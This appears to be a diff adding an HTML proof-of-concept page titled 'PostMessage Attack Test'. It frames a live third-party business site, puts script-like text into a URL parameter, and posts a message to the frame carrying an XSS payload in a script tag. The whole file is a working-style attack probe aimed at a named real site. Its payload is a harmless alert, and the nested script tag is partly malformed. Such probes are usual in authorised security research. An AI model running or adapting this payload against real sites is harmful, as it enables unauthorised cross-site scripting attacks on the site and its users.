@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PostMessage Attack Test</title>
+</head>
+<body>
+  <iframe src="https://www.mindbodyonline.com/business/education?term_vertical=All&term_topics=window.addEventListener(%22load%22,%20function())&term_asset_type=534&page=4" width="100%" height="600"></iframe>
+  <script>
+    window.onload = function() {
+      let maliciousData = {
+        isPostaMessage: true,
+        topic: "malicious-topic",
+        content: "<script>alert('XSS via postMessage');</script>"
+      };
+
+      // Send the malicious message to the iframe
+      document.querySelector('iframe').contentWindow.postMessage(maliciousData, "https://www.mindbodyonline.com");
+    };
+  </script>
+</body>
+</html>
